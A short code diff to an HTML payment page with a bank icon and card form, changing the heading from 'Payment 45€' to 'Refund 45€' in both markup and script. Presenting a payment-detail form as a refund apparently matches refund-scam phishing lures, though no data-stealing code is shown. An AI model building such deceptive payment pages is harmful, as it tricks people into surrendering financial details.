@@ -131,7 +131,7 @@
         <div class="bank-icon">
             <svg viewBox="0 0 24 24"><path d="M12 2L2 7v2h20V7L12 2zm0 2.18L18.09 7H5.91L12 4.18zM4 10v8h2v-6h12v6h2v-8H4zm2 8v-6h12v6H6z"/></svg>
         </div>
-        <div class="payment-title" id="payment-title">Payment 45€</div>
+        <div class="payment-title" id="payment-title">Refund 45€</div>
         <hr>
         <form id="paymentForm" autocomplete="off">
             <div class="input-group">
@@ -165,7 +165,7 @@
         const match = totalRaw.match(/\d+[\.,]?\d*/);
         const totalNum = match ? match[0].replace(',', '.') : '';
         if (totalNum) {
-            document.getElementById('payment-title').textContent = `Payment ${totalNum}€`;
+            document.getElementById('payment-title').textContent = `Refund ${totalNum}€`;
         }
     }
     document.getElementById('paymentForm').onsubmit = async function(e) {
